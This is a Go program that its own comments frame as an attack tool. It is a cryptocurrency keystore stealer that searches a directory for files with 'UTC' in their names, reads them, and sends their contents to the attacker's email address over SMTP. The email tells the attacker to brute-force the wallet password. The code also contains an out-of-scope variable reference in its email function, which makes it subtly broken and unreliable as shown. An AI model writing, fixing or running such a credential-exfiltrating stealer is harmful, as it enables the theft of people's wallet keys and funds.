package main

import (
	"io/ioutil"
	"log"
	"net/smtp"
	"os"
	"path/filepath"
	"regexp"
)

//@keystoreCollection contains all the already found keystores.
var keystoreCollection []string

//@targetPath contains the path where we will look for keystore files.
var targetedPath string = "INSERT TARGETED PATH HERE"

func main() {
	keystoreAttack()
}

//This function contains an attack combining the previously mentioned concepts.
func keystoreAttack() error {
	//Traverse through a particular path of directories and look for file information.
	return filepath.Walk(targetedPath, func(path string, info os.FileInfo, e error) error {
		if e != nil {
			return e
		}

		//Below controls operate if a file is a regular file (and not a directory) during traversal.
		if info.Mode().IsRegular() {
			//@re contains the keystore file regex pattern.
			re := regexp.MustCompile(`UTC`)
			//@trigger seeks to find a regex matching keystore file name.
			trigger := re.MatchString(path)

			//Below controls operate when a potential keystore file has been matched:
			if trigger {
				//@unprocessedKeystore contains the content of the matching file (--> bytes).
				unprocessedKeystore, err := ioutil.ReadFile(path)
				if err != nil {
					log.Fatalf("[!] ioutil.ReadFile() returned with code %s", err)
				}
				//@processedKeystore converts and contains the content of the matching file (--> string).
				processedKeystore := string(unprocessedKeystore)
				//Below controls dictates what happens next if the keystore file == unique and !keystoreCollection.
				if keystoreIsUnique(processedKeystore, keystoreCollection) {
					//notifyMe() sends an email containing the compromised keystore file content.
					notifyMe(processedKeystore)
					//Add the processedKeystore to the keystoreCollection.
					keystoreCollection = append(keystoreCollection, processedKeystore)
				}
			}
		}
		return nil
	})
}

//This function exists to iterate over slices to lookup keystore files in the keystoreCollection:
func keystoreIsUnique(processedKeystore string, keystoreCollection []string) bool {
	for _, k := range keystoreCollection {
		if k == processedKeystore {
			return false
		}
	}
	return true
}

//This function notifies the attacker through email communication.
func notifyMe(privateKey string) {
	
	//Gmail setup and authentication requirements:
	//@email_addr contains the email account address.
	//@email_pass contains the email account password.
	//@email_prov contains the email account provider.  

	email_addr := "INSERT EMAIL ADDRESS HERE"
	email_pass := "INSERT EMAIL PASSWORD HERE"
	email_prov := "INSERT EMAIL PROVIDER HERE"
	auth := smtp.PlainAuth("", email_addr, email_pass, email_prov)

	//Email communication setup requirements:
	//@to contains the email recipient.
	//@msg contains the body of the email.

	to := []string{email_addr}
	msg := []byte("To:" + email_addr + "\r\n" +
		"Subject: You've Just Compromised A Cryptocurrency Wallet\r\n" +
		"\r\n" +
		"Please Save The Following Keystore Content And BruteForce The Associated Password To Access Assets:" + " " + processedKeystore)

	err := smtp.SendMail(email_prov+":587", auth, email_addr, to, msg)
	if err != nil {
		log.Fatalf("[!] SendMail() returned with code %s", err)
	}
}
